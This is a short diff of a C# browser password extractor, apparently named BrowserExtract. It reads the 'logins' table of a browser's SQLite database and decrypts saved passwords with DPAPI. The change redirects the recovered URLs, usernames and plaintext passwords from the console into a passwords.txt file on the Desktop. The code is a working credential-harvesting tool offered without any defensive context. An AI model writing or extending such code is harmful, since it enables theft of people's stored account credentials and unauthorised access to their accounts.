@@ -4,6 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Data.SQLite;
+using System.IO;
 
 namespace BrowserExtract
 {
@@ -19,13 +20,17 @@ namespace BrowserExtract
             command.CommandText = String.Format("SELECT action_url, username_value, password_value FROM logins");
             	SQLiteDataReader reader = command.ExecuteReader();
 
-            while (reader.Read())
+                StreamWriter writer = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\passwords.txt");
 
+            while (reader.Read())
             {
                 byte[] password = (byte[])reader[2];
                 string plaintext = DPAPI.Decrypt(Convert.ToBase64String(password));
 
-                Console.WriteLine(reader[0].ToString() + "|" + reader[1].ToString() + "|" + plaintext);
+                if (reader[0].ToString() != "")
+                {
+                    writer.Write(reader[0].ToString() + " ; " + reader[1].ToString() + " ; " + plaintext + "\n");
+                }
 
             }
             connection.Close();
